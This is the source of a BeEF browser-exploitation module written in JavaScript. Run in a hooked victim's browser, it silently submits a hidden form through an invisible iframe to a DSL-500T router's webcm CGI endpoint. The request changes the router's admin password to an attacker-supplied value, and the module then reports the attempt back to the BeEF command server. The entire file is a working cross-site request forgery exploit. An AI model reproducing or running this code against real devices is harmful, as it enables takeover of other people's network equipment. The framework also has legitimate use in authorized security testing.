//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "/cgi-bin/webcm";

  var dsl500t_iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'getpage');
  input.setAttribute('value', '../html/tools/usrmgmt.htm');
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'security:settings/username');
  input.setAttribute('value', 'admin');
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'security:settings/password');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'security:settings/password_confirm');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'security:settings/idle_timeout');
  input.setAttribute('value', '30');
  form.appendChild(input);

  dsl500t_iframe.contentWindow.document.body.appendChild(form);
  form.submit();

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(dsl500t_iframe);
  }
  setTimeout("cleanup()", 15000);

});

